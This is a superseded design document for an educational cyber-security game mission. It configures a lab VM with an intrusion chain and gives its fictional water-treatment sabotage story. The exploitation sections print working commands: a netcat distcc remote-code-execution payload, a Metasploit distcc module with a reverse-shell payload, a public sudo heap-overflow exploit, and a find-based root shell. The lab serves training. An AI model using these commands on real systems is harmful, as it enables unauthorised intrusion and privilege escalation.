> ⚠️ **SUPERSEDED (2026-08-21).** These stage documents describe the original **water-treatment**
> concept for m04 (chlorine dosing, Dec 2025). The mission was rebuilt as **grid battery storage**
> (Albion Energy Storage) and then aligned to the m01 standard. They are kept for historical
> reference only. The authoritative design is `scenarios/m04_critical_failure/ALIGNMENT_PLAN.md`;
> the current implementation is the scenario and ink files themselves.

# Mission 4: "Critical Failure" - Stage 8: VM Integration & SecGen Configuration

**Mission ID:** m04_critical_failure
**Stage:** 8 - VM Integration and SecGen Configuration
**Version:** 1.0
**Date:** 2025-12-28

---

## Overview

This document specifies the complete SecGen virtual machine configuration for Mission 4 "Critical Failure," including scenario selection, network topology, vulnerability chain, flag placement, and integration with the narrative SCADA investigation theme.

---

## SecGen Scenario Selection

### Primary Scenario: "Vulnerability Analysis"

**Scenario Name:** `vulnerability_analysis`
**Difficulty:** Intermediate (Tier 2)
**Core Vulnerabilities:**
1. Network reconnaissance (Nmap)
2. Service enumeration (FTP, HTTP)
3. Legacy service exploitation (distcc)
4. Privilege escalation (sudo vulnerability - Baron)

**Narrative Fit:**
- Represents compromised SCADA backup server
- Contains ENTROPY attack planning intelligence
- Reveals cross-cell coordination evidence
- Supports 60-80 minute investigation timeline

**Educational Goals:**
- Network mapping and service discovery
- Web application analysis
- Legacy vulnerability exploitation
- Basic privilege escalation

---

## Network Topology

### SCADA Network Simulation

**Network Design:**
- VM represents backup SCADA server
- Simulates water treatment facility network
- Contains evidence of ENTROPY infiltration
- Network isolated from player's system (security)

**IP Configuration:**

```
Player Machine: 192.168.100.1 (host)
SCADA Backup Server: 192.168.100.10 (VM target)
```

**Network Services Exposed:**

| Port | Service | Version | Vulnerability |
|------|---------|---------|---------------|
| 21   | FTP     | vsftpd 2.3.4 | Weak credentials |
| 22   | SSH     | OpenSSH 7.4 | Secure (no exploit) |
| 80   | HTTP    | Apache 2.4 | Web app analysis |
| 3632 | distcc  | distcc 2.x | Remote code execution |

**Firewall Rules:**
- All ports accessible from player machine
- Outbound connections blocked (prevents exfiltration)
- Internal network simulation (no internet access)

---

## Vulnerability Chain & Flag Progression

### Challenge 1: Network Reconnaissance

**Objective:** Scan SCADA network and identify compromised systems
**Narrative Context:** "I need to identify which systems ENTROPY has compromised and map their attack infrastructure."

**Technical Task:**
```bash
# Player executes on VM terminal
nmap -sV -sC 192.168.100.10
```

**Expected Discoveries:**
- Open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 3632 (distcc)
- Service versions identified
- Banner information revealing "SCADA Backup Server"

**Flag Location:** `/root/network_topology.txt`
**Flag Value:** `flag{network_scan_complete}`
**Access Method:** Flag appears after successful Nmap scan completion

**Hint System:**
- Robert Chen (radio): "Check the network infrastructure. We need to know what systems they're controlling."
- Terminal prompt: "Run network scan to identify active services"

**Validation:**
- Player must discover all 4 open ports
- Service version detection required
- Flag submission via drop-site terminal (Task 2.3)

---

### Challenge 2A: FTP Service Investigation

**Objective:** Access FTP server and gather attack planning intelligence
**Narrative Context:** "OptiGrid technicians had maintenance access. Check for any files they might have left."

**Technical Task:**
```bash
# Attempt anonymous login
ftp 192.168.100.10

# Try weak credentials
Username: optigrid
Password: maintenance2024
```

**FTP Server Contents:**
```
/ftp_root/
├── attack_planning/
│   ├── facility_vulnerability_assessment.pdf
│   ├── dosing_schedule.txt
│   └── coordination_timeline.txt
├── optigrid_cover/
│   ├── legitimate_contracts.txt
│   └── facility_access_log.csv
└── flag_intel.txt
```

**Flag Location:** `/ftp_root/flag_intel.txt`
**Flag Value:** `flag{ftp_intel_gathered}`
**File Contents:**
```
OPERATION: AQUA TEST
FACILITY: Pacific Northwest Regional Water Treatment
OBJECTIVE: Contamination event demonstration

COORDINATION:
- Critical Mass: Infrastructure attack execution
- Social Fabric: Public panic amplification (3 cities ready)

COVER COMPANY: OptiGrid Solutions
CONTRACT FACILITIES: 40 nationwide

The Architect's Phase 2 initiative proceeds as planned.

[FLAG]: flag{ftp_intel_gathered}
```

**Intelligence Gained:**
- Attack is a "test run"
- Cross-cell coordination explicit (Critical Mass + Social Fabric)
- OptiGrid Solutions identified as cover company
- Reference to "The Architect's Phase 2"
- 40 facilities potentially compromised

**Validation:**
- Player must successfully login to FTP
- Read flag_intel.txt file
- Flag submission via drop-site terminal (Task 2.5)

---

### Challenge 2B: HTTP Web Application Analysis

**Objective:** Analyze SCADA web interface and decode attack schedule
**Narrative Context:** "ENTROPY modified the SCADA parameters remotely. Check the web interface for their access points."

**HTTP Service Details:**
- **URL:** `http://192.168.100.10`
- **Application:** SCADA Remote Monitoring Interface
- **Authentication:** Basic auth (weak credentials)

**Technical Task:**
```bash
# Access web interface
curl http://192.168.100.10

# Try credentials
Username: admin
Password: scada2024

# Or discover in HTML source
curl http://192.168.100.10/admin_panel.html
```

**Web Pages:**

1. **Index Page** (`/index.html`):
   - SCADA status dashboard
   - Chemical dosing parameters visible
   - Modified values highlighted in red

2. **Admin Panel** (`/admin_panel.html`):
   - Requires authentication
   - Shows recent parameter changes
   - Base64-encoded attack schedule in HTML comments

**Attack Schedule (Base64-encoded):**
```html
<!-- Attack Schedule (Base64):
QXR0YWNrIFNjaGVkdWxlOgowODAwIEhPVVJTIC0gRG9zaW5nIHN0YXRpb25zIDEsIDIsIDMgdHJpZ2dlcgpDaGxvcmluZTogMzAwJSBub3JtYWwgbGV2ZWxzCnBIOiA0LjUgKGFjaWRpYykKRXhwZWN0ZWQgY29udGFtaW5hdGlvbjogMi0zIGhvdXJzCgpTb2NpYWwgRmFicmljIGRpc2luZm9ybWF0aW9uIGNhbXBhaWduIGFjdGl2YXRlZCBzaW11bHRhbmVvdXNseSBpbjoKLSBTZWF0dGxlCi0gUG9ydGxhbmQKLSBCb2lzZQoKW0ZMQUddOiBmbGFne2h0dHBfYW5hbHlzaXNfY29tcGxldGV9
-->
```

**Decoded Content:**
```
Attack Schedule:
0800 HOURS - Dosing stations 1, 2, 3 trigger
Chlorine: 300% normal levels
pH: 4.5 (acidic)
Expected contamination: 2-3 hours

Social Fabric disinformation campaign activated simultaneously in:
- Seattle
- Portland
- Boise

[FLAG]: flag{http_analysis_complete}
```

**Flag Value:** `flag{http_analysis_complete}`

**Intelligence Gained:**
- Exact attack time confirmed (0800 hours)
- Technical attack parameters (chlorine levels, pH)
- Contamination timeline (2-3 hours to reach distribution)
- Social Fabric coordination in 3 specific cities
- Multi-pronged attack strategy evident

**Validation:**
- Player must access admin panel
- Decode Base64 attack schedule
- Understand cross-cell coordination
- Flag submission via drop-site terminal (Task 2.6)

---

### Challenge 3: Legacy Service Exploitation (distcc)

**Objective:** Exploit distcc vulnerability to access attack control files
**Narrative Context:** "We need to find how they're controlling the attack. The backup server might have their control scripts."

**distcc Vulnerability:**
- **Service:** distcc daemon (distributed C/C++ compilation)
- **Port:** 3632
- **Vulnerability:** CVE-2004-2687 (Remote Code Execution)
- **Description:** distcc allows arbitrary code execution without authentication

**Technical Task:**
```bash
# Scan for distcc
nmap -p 3632 192.168.100.10

# Exploit using Metasploit or manual method
# Manual method for educational value:
echo 'DIST00000001\nARGC00000008\nARGV00000002gcc\nARGV00000002-c\nARGV00000008test.c\nARGV00000002-o\nARGV00000008test.o\nARGV00000009test.c\nDOTI00000000\n' | nc 192.168.100.10 3632

# Or use Metasploit module
use exploit/unix/misc/distcc_exec
set RHOST 192.168.100.10
set payload cmd/unix/reverse
exploit
```

**Initial Access:**
- Shell as user `distccd` (low privilege)
- Limited file system access
- Cannot read `/root/` directory (flag location)

**Privilege Escalation Required:** See Challenge 4

**Files Accessible (Low Privilege):**
```
/opt/scada_backup/
├── backup_schedules.txt
├── system_logs/
└── attack_vectors/
    ├── dosing_station_bypass.sh
    ├── scada_control_script.py
    └── trigger_mechanism.conf
```

**Intelligence from attack_vectors:**
- `dosing_station_bypass.sh`: Physical bypass device control script
- `scada_control_script.py`: Malicious SCADA automation script
- `trigger_mechanism.conf`: Remote trigger configuration (points to Voltage's laptop)

**Flag Location:** `/root/distcc_access_granted.txt`
**Access:** Requires privilege escalation to root

---

### Challenge 4: Privilege Escalation (sudo Baron)

**Objective:** Escalate privileges to access complete attack intelligence
**Narrative Context:** "We need full system access to identify all attack vectors and disabling mechanisms."

**Sudo Vulnerability:**
- **Type:** CVE-2021-3156 "Baron Samedit" (or similar sudo vulnerability)
- **Affected Version:** sudo 1.8.27
- **Description:** Heap-based buffer overflow in sudo

**Technical Task:**
```bash
# Check sudo version
sudo --version

# Check sudo permissions
sudo -l

# Output shows vulnerable sudo version
# Download/use exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./exploit

# Gain root shell
whoami
# Output: root
```

**Alternative Educational Path:**
```bash
# If Baron Samedit too complex, use simpler sudo misconfiguration
sudo -l
# Shows: (ALL) NOPASSWD: /usr/bin/find

# Exploit find with GTFOBins method
sudo find /etc -exec /bin/sh \;
# Gain root shell
```

**Root Access Gained:**

**Files Now Accessible:**
```
/root/
├── distcc_access_granted.txt (FLAG)
├── attack_control/
│   ├── disable_attack_procedure.txt
│   ├── scada_network_map.png
│   └── entropy_coordination_log.txt
└── optigrid_facilities_database.csv
```

**Flag Location:** `/root/distcc_access_granted.txt`
**Flag Value:** `flag{distcc_exploit_complete}`
**File Contents:**
```
SCADA BACKUP SERVER - ROOT ACCESS ACHIEVED

ATTACK MECHANISM IDENTIFIED:

Vector 1: Physical bypass devices on dosing stations 1, 2, 3
Vector 2: Malicious SCADA control script (this server)
Vector 3: Remote trigger mechanism (Voltage's command laptop)

ALL THREE VECTORS MUST BE DISABLED TO PREVENT ATTACK

DISABLING PROCEDURE:
1. Remove physical bypass devices from dosing control panels
2. Delete malicious SCADA script: /opt/scada_backup/attack_vectors/scada_control_script.py
3. Secure/destroy remote trigger mechanism (Maintenance Wing)

CRITICAL: Wrong disabling sequence may trigger fail-safe contamination

[FLAG]: flag{distcc_exploit_complete}
```

**Intelligence Gained:**
- Complete attack mechanism revealed (3 vectors)
- Disabling procedure documented
- Warning about fail-safe (adds tension)
- Confirms need to confront Voltage (Task 3.1)

**Validation:**
- Player must exploit distcc
- Escalate privileges to root
- Read flag file
- Flag submission via drop-site terminal (Task 2.8)

---

## VM-Launcher Integration

### VM Launcher Object Configuration

**Object ID:** `obj_network_terminal`
**Location:** Server Room (room_server)
**Type:** `vm_launcher`

**Configuration JSON:**
```json
{
  "object_id": "obj_network_terminal",
  "type": "vm_launcher",
  "display_name": "Network Investigation Terminal",
  "description": "SCADA network terminal with remote access to backup server",
  "vm_configuration": {
    "vm_id": "vulnerability_analysis_scada",
    "scenario_name": "vulnerability_analysis",
    "vm_title": "SCADA Network Backup Server",
    "ip_address": "192.168.100.10",
    "network_range": "192.168.100.0/24",
    "difficulty": "intermediate",
    "estimated_time": "30-40 minutes",
    "hacktivity_mode": true,
    "console_access": true,
    "tools_available": [
      "nmap",
      "ftp",
      "curl",
      "wget",
      "nc",
      "python3",
      "metasploit"
    ]
  },
  "narrative_context": {
    "introduction": "Access the facility's network infrastructure to investigate ENTROPY's system compromise. This terminal connects to the SCADA backup server.",
    "task_description": "Scan the network, identify compromised services, gather attack planning intelligence, and locate the attack control mechanism.",
    "robert_chen_advice": "Those parameters are changing remotely. Someone's got access to the backup server. You'll need to dig into the network to find their control system."
  },
  "interaction_requirements": {
    "required_task": "locate_compromised_systems",
    "required_item": null,
    "can_leave_and_return": true,
    "progress_saved": true
  }
}
```

---

## Flag Station Integration

### Flag Submission Terminal Configuration

**Object ID:** `obj_drop_site_terminal`
**Location:** Server Room (room_server)
**Type:** `flag_station`

**Configuration JSON:**
```json
{
  "object_id": "obj_drop_site_terminal",
  "type": "flag_station",
  "display_name": "Evidence Drop-Site Terminal",
  "description": "SAFETYNET secure terminal for submitting intelligence gathered from VM investigation",
  "flag_station_id": "drop_site_terminal",
  "accepts_vms": ["vulnerability_analysis_scada"],
  "flags": [
    {
      "flag_value": "flag{network_scan_complete}",
      "flag_name": "Network Reconnaissance Evidence",
      "description": "SCADA network topology mapped, compromised systems identified",
      "points": 100,
      "task_completion": "submit_network_scan_flag",
      "reward_event": "network_scan_evidence_submitted"
    },
    {
      "flag_value": "flag{ftp_intel_gathered}",
      "flag_name": "FTP Intelligence Documents",
      "description": "Attack planning materials and cross-cell coordination evidence",
      "points": 150,
      "task_completion": "submit_ftp_intel_flag",
      "reward_event": "ftp_intelligence_documented"
    },
    {
      "flag_value": "flag{http_analysis_complete}",
      "flag_name": "SCADA Web Interface Analysis",
      "description": "Attack schedule decoded, Social Fabric coordination confirmed",
      "points": 150,
      "task_completion": "submit_http_analysis_flag",
      "reward_event": "http_analysis_documented"
    },
    {
      "flag_value": "flag{distcc_exploit_complete}",
      "flag_name": "Attack Control Mechanism Intelligence",
      "description": "Complete attack vector identification and disabling procedure",
      "points": 200,
      "task_completion": "submit_distcc_exploit_flag",
      "reward_event": "attack_mechanism_identified"
    }
  ],
  "total_possible_points": 600,
  "narrative_context": {
    "terminal_greeting": "SAFETYNET SECURE INTELLIGENCE TERMINAL\n\nSubmit evidence gathered from SCADA network investigation.\n\nAll submissions encrypted and transmitted to Task Force Null database.",
    "submission_success": "Evidence received and documented. SAFETYNET intelligence database updated.",
    "all_flags_complete": "Complete attack intelligence gathered. All attack vectors identified. Proceed to neutralization phase."
  }
}
```

---

## Narrative-Technical Integration Points

### Task 2.2: Scan SCADA Network

**Trigger:** Player interacts with VM launcher terminal
**VM Action:** Launch vulnerability_analysis scenario
**Narrative Prompt:** "Examine the SCADA network to identify which systems ENTROPY has compromised."

**Player Actions:**
1. Launch VM from terminal
2. Execute Nmap scan on 192.168.100.10
3. Identify open services
4. Document network topology

**Flag Obtainment:** Network scan flag appears in `/root/network_topology.txt`
**Submission:** Player submits `flag{network_scan_complete}` at drop-site terminal

**Robert Chen Support (Radio):**
"Those SCADA systems shouldn't have those ports open. Someone's been modifying our network security. Document everything you find."

---

### Task 2.4: Investigate Compromised Services

**Narrative Prompt:** "Analyze the FTP and HTTP services for attack planning materials and intelligence."

**Player Actions:**
1. Access FTP server with optigrid credentials
2. Read attack planning documents
3. Access HTTP admin panel
4. Decode Base64 attack schedule

**Flags Obtainment:**
- FTP: `flag{ftp_intel_gathered}` from `/ftp_root/flag_intel.txt`
- HTTP: `flag{http_analysis_complete}` from decoded Base64 in HTML comments

**Intelligence Revelation:**
- Cross-cell coordination explicit
- Social Fabric cities identified (Seattle, Portland, Boise)
- OptiGrid Solutions cover company confirmed
- The Architect referenced

**Robert Chen Support:**
"OptiGrid Solutions... those were the maintenance technicians I authorized. My God, they had full access for three days."

**Agent 0x99 Call (After HTTP flag):**
"The intelligence you're gathering confirms our worst fears. Social Fabric coordinating with Critical Mass. This is unprecedented cell cooperation. Keep digging—we need to know the full attack mechanism."

---

### Task 2.7: Exploit Distcc Vulnerability

**Narrative Prompt:** "Exploit the vulnerable distcc service to access the attack control system."

**Player Actions:**
1. Identify distcc service (port 3632)
2. Exploit remote code execution vulnerability
3. Escalate privileges (sudo Baron or similar)
4. Access root directory
5. Read attack control files

**Flag Obtainment:** `flag{distcc_exploit_complete}` from `/root/distcc_access_granted.txt`

**Critical Intelligence:**
- All three attack vectors revealed
- Disabling procedure documented
- Confirms need to confront Voltage

**Robert Chen Support:**
"Three attack vectors? They built in redundancy. We'll need to disable all three or the attack still executes. The physical bypass devices are in chemical storage—I'll guide you through disabling them when you're ready."

**Agent 0x99 Call (After distcc flag):**
"Excellent work. You've identified the complete attack mechanism. New priority: capture Voltage if possible during the neutralization phase. We need intelligence on The Architect's larger infrastructure initiative."

---

## Difficulty Balancing

### Intermediate Player Expectations

**Target Skill Level:**
- Completed M1-M3 (basic VM challenges)
- Familiar with Nmap, basic exploitation
- Understands privilege escalation concepts
- 30-40 minutes estimated completion time

**Challenge Progression:**

1. **Network Scan (Easy):**
   - Straightforward Nmap command
   - Clear instructions in narrative
   - Flag easily obtainable

2. **Service Investigation (Easy-Moderate):**
   - FTP: Weak credentials guessable or hinted
   - HTTP: Base64 decoding educational but not difficult
   - Flags clearly marked in files

3. **distcc Exploitation (Moderate):**
   - Requires research or tool usage (Metasploit)
   - Privilege escalation adds complexity
   - Educational about legacy vulnerabilities

**Hint System:**

**Level 1 (Subtle - Robert Chen):**
- "Check the network infrastructure"
- "OptiGrid had access to our FTP server"
- "The web interface shows modified parameters"

**Level 2 (Specific - Terminal Prompts):**
- "Run Nmap scan on 192.168.100.10"
- "Try common maintenance credentials on FTP"
- "Check HTML source for encoded data"

**Level 3 (Explicit - Agent 0x99 if stuck):**
- "Use Nmap to scan all ports on the backup server"
- "Common OptiGrid credentials: optigrid/maintenance2024"
- "Base64-encoded data is in the HTML comments of the admin panel"

**No Level 4 Needed:** No super-difficult challenges that require maximum hints

---

## Testing & Validation

### Pre-Release Testing Checklist

**VM Functionality:**
- [ ] VM launches successfully from terminal
- [ ] All services (FTP, SSH, HTTP, distcc) accessible
- [ ] Network isolation working (no internet access from VM)
- [ ] Player machine can access VM at 192.168.100.10

**Flag Accessibility:**
- [ ] All 4 flags obtainable through legitimate paths
- [ ] Flags clearly marked in files
- [ ] Flag station accepts all flag values
- [ ] Flag submission triggers correct task completions

**Difficulty Validation:**
- [ ] Intermediate players complete in 30-40 minutes
- [ ] Hint system provides adequate guidance
- [ ] No dead ends or unsolvable challenges
- [ ] Exploit tools (Metasploit) function correctly

**Narrative Integration:**
- [ ] VM challenges feel motivated by story
- [ ] Intelligence gathered advances plot
- [ ] Robert Chen and 0x99 support dialogue triggers appropriately
- [ ] Flags submission unlocks correct objectives

**Educational Value:**
- [ ] Players learn network reconnaissance
- [ ] Service enumeration skills practiced
- [ ] Legacy vulnerability awareness gained
- [ ] Privilege escalation concepts understood

---

## SecGen Scenario Configuration File

### scenario.xml (Abbreviated)

```xml
<?xml version="1.0"?>
<scenario xmlns="http://www.github/cliffe/SecGen/scenario"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://www.github/cliffe/SecGen/scenario">

  <name>M04 Critical Failure - SCADA Vulnerability Analysis</name>
  <author>Break Escape Development Team</author>
  <description>
    Water treatment facility SCADA backup server compromised by ENTROPY.
    Intermediate-level vulnerability analysis scenario.
  </description>

  <type>ctf</type>
  <difficulty>intermediate</difficulty>

  <system>
    <system_name>scada_backup_server</system_name>
    <base platform="linux" distro="debian" version="10"/>

    <service type="ftp">
      <name>vsftpd</name>
      <version>2.3.4</version>
      <module_path>services/ftp/vsftpd_weak_credentials</module_path>
      <input into="username">optigrid</input>
      <input into="password">maintenance2024</input>
    </service>

    <service type="http">
      <name>apache</name>
      <version>2.4</version>
      <module_path>services/http/scada_interface</module_path>
    </service>

    <service type="distcc">
      <name>distcc</name>
      <version>2.x</version>
      <module_path>services/compilation/distcc_rce</module_path>
    </service>

    <vulnerability type="sudo">
      <module_path>vulnerabilities/privilege_escalation/sudo_baron</module_path>
    </vulnerability>

    <flag type="network_scan">
      <location>/root/network_topology.txt</location>
      <value>flag{network_scan_complete}</value>
    </flag>

    <flag type="ftp_intel">
      <location>/ftp_root/flag_intel.txt</location>
      <value>flag{ftp_intel_gathered}</value>
    </flag>

    <flag type="http_analysis">
      <location>/var/www/html/admin_panel.html</location>
      <encoding>base64</encoding>
      <value>flag{http_analysis_complete}</value>
    </flag>

    <flag type="distcc_exploit">
      <location>/root/distcc_access_granted.txt</location>
      <value>flag{distcc_exploit_complete}</value>
    </flag>

  </system>

  <network type="private_network">
    <range>192.168.100.0/24</range>
  </network>

</scenario>
```

---

## Success Criteria for VM Integration

### Technical Success:
- 95%+ VM launch success rate
- All flags obtainable by intermediate players
- 0 game-breaking bugs in VM environment
- Network isolation secure

### Educational Success:
- 80%+ players report learning new skills
- Challenge difficulty appropriate for intermediate level
- Hint system adequate without being patronizing
- Real-world vulnerability awareness increased

### Narrative Success:
- 85%+ players feel VM challenges motivated by story
- Intelligence gathered feels meaningful
- SCADA investigation theme authentic
- Cross-cell coordination revelation impactful

---

## Stage 8 Completion Checklist

- [x] SecGen scenario selected and justified
- [x] Network topology designed
- [x] All 4 flags defined with locations and values
- [x] Vulnerability chain documented (Nmap → FTP/HTTP → distcc → sudo)
- [x] VM-launcher configuration specified
- [x] Flag-station configuration specified
- [x] Narrative-technical integration points detailed
- [x] Difficulty balancing and hint system designed
- [x] Testing checklist created
- [x] SecGen scenario.xml structure provided

---

## Next Stage Preparation

**Stage 9: Scenario JSON Assembly**
- Complete scenario.json.erb file creation
- All objectives, tasks, rooms, NPCs, objects integration
- ERB templating and variable usage
- VM and flag station ERB helper integration
- Schema validation preparation
- Final assembly and testing procedures

**Key Questions for Stage 9:**
- How do we ensure 0-5 validation errors (vs M3's 46)?
- What ERB helpers are needed for VM integration?
- How do we structure objectives and tasks in JSON?
- What validation checkpoints prevent common errors?

---

**Status:** Stage 8 Complete - Ready for Stage 9
**Estimated Development Time:** 20-30 hours for SecGen scenario creation and testing
**Quality Assessment:** Comprehensive VM integration with clear educational progression, narrative motivation, and intermediate-appropriate difficulty

---

*Stage 8 establishes the complete SecGen VM configuration for Mission 4, providing detailed vulnerability chains, flag placement, narrative integration, and testing procedures. The "Vulnerability Analysis" scenario authentically supports the SCADA investigation theme while delivering intermediate-level cybersecurity education.*
